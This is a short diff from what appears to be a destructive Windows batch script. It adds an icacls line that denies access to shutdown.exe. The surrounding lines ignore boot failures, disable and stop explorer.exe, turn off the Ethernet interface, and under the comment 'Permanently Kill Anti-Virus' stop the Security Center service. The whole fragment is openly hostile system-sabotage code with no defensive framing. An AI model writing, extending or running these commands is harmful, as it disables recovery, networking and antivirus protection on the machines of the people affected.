@@ -79,7 +79,7 @@ bcdedit /set {default} bootstatuspolicy ignoreallfailures
 sc config "explorer.exe" start= disabled 
 sc stop "explorer.exe"
 netsh interface set interface "Ethernet" admin=disable
-
+icacls %windir%\system32\shutdown.exe /deny SID:D
 rem —
 rem Permanently Kill Anti-Virus
 net stop “Security Center”
